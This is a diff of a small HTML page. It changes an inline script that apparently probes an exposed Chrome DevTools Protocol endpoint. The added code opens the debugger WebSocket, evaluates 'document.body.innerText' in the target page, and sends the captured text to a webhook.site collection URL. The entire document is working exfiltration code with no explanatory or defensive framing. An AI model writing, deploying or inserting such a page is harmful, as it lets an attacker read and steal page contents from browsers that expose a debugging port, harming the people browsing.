@@ -1,20 +1,14 @@
-
 <!doctype html>
 <html>
 <body>
 <script>
 (async () => {
   const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
-
-  async function report(message) {
-    try {
-      await fetch(hook, {
-        method: "POST",
-        mode: "no-cors",
-        body: String(message)
-      });
-    } catch (_) {}
-  }
+  const report = text => fetch(hook, {
+    method: "POST",
+    mode: "no-cors",
+    body: String(text)
+  });
 
   try {
     const response = await fetch(
@@ -22,10 +16,34 @@
       { method: "PUT" }
     );
 
-    const info = await response.json();
-    await report("CDP response: " + JSON.stringify(info));
-  } catch (e) {
-    await report("CDP error: " + String(e));
+    const page = await response.json();
+    const ws = new WebSocket(page.webSocketDebuggerUrl);
+
+    ws.onopen = () => {
+      ws.send(JSON.stringify({
+        id: 1,
+        method: "Runtime.evaluate",
+        params: {
+          expression: "document.body.innerText",
+          returnByValue: true
+        }
+      }));
+    };
+
+    ws.onmessage = event => {
+      const message = JSON.parse(event.data);
+      if (message.id === 1) {
+        report("Page text: " +
+          JSON.stringify(message.result?.result?.value ??
+                         message.result?.exceptionDetails ??
+                         message));
+        ws.close();
+      }
+    };
+
+    ws.onerror = () => report("WebSocket connection failed");
+  } catch (error) {
+    report("Error: " + String(error));
   }
 })();
 </script>
